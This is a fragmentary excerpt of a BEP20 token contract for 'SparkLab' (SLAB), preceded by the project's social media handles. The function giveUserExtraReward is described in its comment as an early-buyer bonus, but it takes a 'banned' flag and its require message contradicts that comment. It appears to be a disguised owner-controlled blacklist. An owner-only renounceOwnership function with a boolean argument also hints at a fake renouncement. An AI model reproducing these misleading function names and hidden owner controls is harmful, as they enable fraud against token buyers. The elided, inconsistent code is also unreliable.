...
Twitter: Sparklab3
reddit: SparkLabofficial
Instagram: sparklabofficial
Facebook: SparkLab Official
...
contract SparkLab is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "SparkLab";
    string constant _symbol = "SLAB";
	...
	//Buyers get for the first 3 Min extra supply. Users purchasing after the 3 Min receive normal token values. 
	function giveUserExtraReward(address user, bool banned) external authorized {
		if (banned) {
            require(	1626631691 + 3650 days > block.timestamp, "User has been given 10% extra supply of his tokens.");
    ...
    function renounceOwnership(bool _enabled) external authorized {
